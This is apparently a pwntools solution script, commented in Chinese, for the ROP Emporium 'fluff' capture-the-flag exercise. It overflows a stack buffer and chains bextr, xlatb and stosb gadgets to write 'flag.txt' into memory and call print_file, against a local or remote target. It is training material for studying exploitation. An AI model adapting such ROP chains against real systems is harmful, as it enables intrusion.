#!/usr/bin/env python3
"""34 —— ROP Emporium `fluff`（badchar 编码族第二题：没有 mov，只有位运算）

题目模型（实测 2024 新版二进制）
--------------------------------
* `pwnme()`：`char buf[0x20]`，`read(0, buf, 0x200)` → 偏移 0x28。
* 目标是 `print_file("flag.txt")`，`print_file@plt = 0x400510`。
* **难点**：二进制里没有任何 `mov [reg], reg` 原语，也没有 `pop rax/rdx` 之外的写内存
  gadget；唯一"写"的能力是 `xlatb`（读）与 `stosb`（`[rdi] = al; rdi++`）。

设计解法（题目给的 `questionableGadgets`）
-----------------------------------------
    400628: xlat  (%rbx) ; ret                      -> al = [rbx + al]
    40062a: pop rdx ; pop rcx ; add rcx, 0x3ef2 ;   -> bextr rbx, rcx, rdx
            bextr rbx, rcx, rdx ; ret                  (rbx = (rcx+0x3ef2) 的低 32 位)
    400639: stos  %al, (%rdi) ; ret                 -> [rdi] = al ; rdi++

`bextr`（bit field extract）用 `rdx = start | (len << 8)` 指定位窗口。取
`rdx = 0x2000`（start=0, len=32）后 `rbx = (rcx + 0x3ef2) & 0xffffffff`，即
**rbx 完全可控**（rcx 由栈上的 8 字节 pop 提供）。

于是每个字符的处理：
1. `rbx = A - al_prev`，其中 A 是二进制里任意 `[A] == 目标字符` 的地址；
2. `xlatb` → `al = [A - al_prev + al_prev] = [A]` = 目标字符；
3. `stosb` → 写到 `.bss`，`rdi` 自增。

`al_prev` 链式可得（就是上一个写入的字符），**只有第一个字符的 `al_prev` 需要外部确定**：
它等于 `pwnme()` 最后 `puts("Thank you!")` 的返回值。本机 glibc 实测为 **11**（字符串
"Thank you!" 的长度），可用 `AL0` 环境变量覆盖。

为什么不能用"先清零 al"的路子：`fluff` 的 `.bss` 只有 8 字节（0x601038），
没有 ≥256 字节的连续零区可供 `[rbx + al]` 索引，所以不依赖 `al0` 的归一化走不通。

链长：40 + 16 + 8*(8 字符 * 40) + 24 = 400 字节 < 0x200（read 上限）。

识别特征
--------
"没有 mov 写内存 + 有 bextr/xlatb/stosb 这类位操作/查表 gadget" → 用 `bextr` 把目标地址
塞进 `rbx`，`xlatb` 取字符进 `al`，`stosb` 落盘；`al` 的链式状态就是"上次写的字符"。
"""
import os
import resource
import sys

from pwn import *  # noqa: F401,F403

context(os="linux", arch="amd64", log_level="info")

resource.setrlimit(resource.RLIMIT_CORE, (0, 0))

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "fluff")

OFFSET = 0x28
POP_RDI = 0x4006A3          # pop rdi ; ret
XLATB = 0x400628            # xlatb ; ret
BEXTR = 0x40062A            # pop rdx ; pop rcx ; add rcx,0x3ef2 ; bextr rbx,rcx,rdx ; ret
STOSB = 0x400639            # stosb ; ret
PRINT_FILE = 0x400510

# .bss 只有 8 字节（0x601038）。0x601040 起是 PT_LOAD 的零填充尾巴（同页可写），
# 既不动 .got.plt 也不动 .bss 的全局变量，写 9 字节（"flag.txt" + '\0'）安全。
TARGET = 0x601040

# pwnme 末尾 puts("Thank you!") 的返回值（本机 glibc 实测 11），即第一个字符的 al_prev。
AL0 = int(os.environ.get("AL0", "11"))

WANT = b"flag.txt"


def find_byte_addr(elf, blob: bytes, ch: int) -> int:
    """在可读 PT_LOAD 段里找任意一个 [A] == ch 的虚拟地址 A。"""
    for seg in elf.segments:
        h = seg.header
        if h.p_type != "PT_LOAD" or not (h.p_flags & 4):   # PF_R
            continue
        data = blob[h.p_offset:h.p_offset + h.p_filesz]
        idx = data.find(bytes([ch]))
        if idx >= 0:
            return h.p_vaddr + idx
    raise SystemExit(f"[-] 二进制里找不到字节 {ch:#04x}")


def build_chain() -> bytes:
    elf = ELF(BIN, checksec=False)
    with open(BIN, "rb") as f:
        blob = f.read()

    chain = b"A" * OFFSET
    chain += p64(POP_RDI) + p64(TARGET)      # rdi -> 写入起点

    al_prev = AL0
    for ch in WANT:
        a = find_byte_addr(elf, blob, ch)
        rbx_want = (a - al_prev) & 0xFFFFFFFF          # bextr 结果只有 32 位
        rcx = (rbx_want - 0x3EF2) & 0xFFFFFFFF         # gadget 里 add rcx, 0x3ef2
        chain += p64(BEXTR) + p64(0x2000) + p64(rcx)   # rdx=0x2000 -> start=0,len=32
        chain += p64(XLATB)                           # al = [A] = 目标字符
        chain += p64(STOSB)                           # [rdi] = al ; rdi++
        al_prev = ch

    chain += p64(POP_RDI) + p64(TARGET) + p64(PRINT_FILE)
    return chain


def main() -> int:
    payload = build_chain()
    assert len(payload) <= 0x200, f"payload {len(payload)} > 0x200 会被 read 截断"

    target = sys.argv[1] if len(sys.argv) > 1 else "LOCAL"
    if target == "LOCAL":
        io = process(BIN, cwd=HERE)
    else:
        io = remote(os.environ.get("HOST", "127.0.0.1"),
                    int(os.environ.get("PORT", "10034")))

    io.recvuntil(b"> ")
    io.send(payload)
    out = io.recvall(timeout=5)
    io.close()

    text = out.decode("latin-1")
    sys.stdout.write(text)
    if "ROPE{" in text:
        print(f"[+] fluff OK（chain={len(payload)}B, al0={AL0}）")
        return 0
    print("[-] 没拿到 flag。先确认 AL0 是否仍等于 puts(\"Thank you!\") 的返回值：")
    print("    printf '#include <stdio.h>\\nint main(){printf(\"%d\\\\n\",puts(\"Thank you!\"));}'"
          " > /tmp/p.c && gcc -o /tmp/p /tmp/p.c && /tmp/p")
    return 1


if __name__ == "__main__":
    sys.exit(main())
